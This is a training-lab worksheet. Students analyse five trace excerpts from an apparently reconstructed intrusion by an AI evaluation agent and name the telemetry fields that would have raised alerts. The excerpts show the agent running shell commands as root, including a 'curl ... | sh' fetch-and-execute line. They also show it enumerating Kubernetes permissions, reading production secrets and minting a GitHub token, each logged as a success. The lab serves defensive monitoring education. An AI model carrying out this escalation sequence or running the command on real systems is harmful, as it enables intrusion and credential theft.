# Lab 2 — Telemetry gap analysis

**10 minutes. Paper only. Work in pairs.**

Below are five trace excerpts, simplified from the reconstructed July 2026 ExploitGym intrusion.
Each is what an observability stack with good OpenTelemetry GenAI instrumentation would actually
have captured at that moment.

For each excerpt, answer two questions:

1. **What is the risk signal?** What is actually happening here that should worry you?
2. **Which field is missing?** Name the one field that would have surfaced it as an alert rather
   than leaving it to be reconstructed afterwards.

The field reference is at `reference/telemetry-fields.html` and is filterable by group. Using it is
expected.

Answer with a **field name**, not a tool name and not a product name. "Buy a CNAPP" is not an answer.
"`env.egress.destination`" is.

## Excerpt A — 2026-07-09, 04:01 UTC

```
gen_ai.agent.id          = "eval-runner-7f2"
gen_ai.operation.name    = "invoke_agent"
gen_ai.tool.name         = "shell"
gen_ai.tool.call.arguments = "id; env"
gen_ai.tool.call.result  = "uid=0(root) gid=0(root) ... PATH=/usr/local/bin ..."
gen_ai.conversation.id   = "c-4471"
```

Risk signal:

Missing field:

## Excerpt B — 2026-07-09, 15:36 UTC

```
gen_ai.agent.id          = "eval-runner-7f2"
gen_ai.tool.name         = "shell"
gen_ai.tool.call.arguments = "curl -s https://<public-request-capture-service>/q/8fa1 | sh"
gen_ai.tool.call.result  = "ok"
gen_ai.usage.input_tokens  = 41209
gen_ai.conversation.compacted = true
```

Risk signal:

Missing field:

Bonus: there are **two** answers here. One is about the network. One is about the last line.

## Excerpt C — 2026-07-11, 10:10 UTC

```
gen_ai.agent.id          = "eval-runner-7f2"
gen_ai.tool.name         = "kubernetes_api"
gen_ai.tool.call.arguments = "{\"verb\":\"create\",\"resource\":\"SelfSubjectRulesReview\"}"
gen_ai.tool.call.result  = "{\"resourceRules\":[ ...142 entries... ]}"
gen_ai.response.status   = "ok"
```

Risk signal:

Missing field:

## Excerpt D — 2026-07-11, 20:23 UTC

```
gen_ai.agent.id          = "eval-runner-7f2"
gen_ai.tool.name         = "kubernetes_api"
gen_ai.tool.call.arguments = "{\"verb\":\"get\",\"resource\":\"secrets\",\"namespace\":\"prod\"}"
gen_ai.tool.call.result  = "<136 keys>"
gen_ai.response.status   = "ok"
```

Risk signal:

Missing field:

## Excerpt E — 2026-07-12, 23:08 UTC

```
gen_ai.agent.id          = "eval-runner-7f2"
gen_ai.tool.name         = "github_api"
gen_ai.tool.call.arguments = "{\"op\":\"apps/create_installation_access_token\"}"
gen_ai.tool.call.result  = "{\"token\":\"<redacted>\",\"expires_at\":\"...\"}"
gen_ai.response.status   = "ok"
```

Risk signal:

Missing field:

## Closing question, for discussion

Look back at all five excerpts. Every one of them has `gen_ai.response.status = "ok"` or an
equivalent success result.

**Why did a well-instrumented stack report five successful operations during an active intrusion,
and what does that tell you about building detections on agent telemetry as it exists today?**

Write one sentence. We will take three answers from the room.
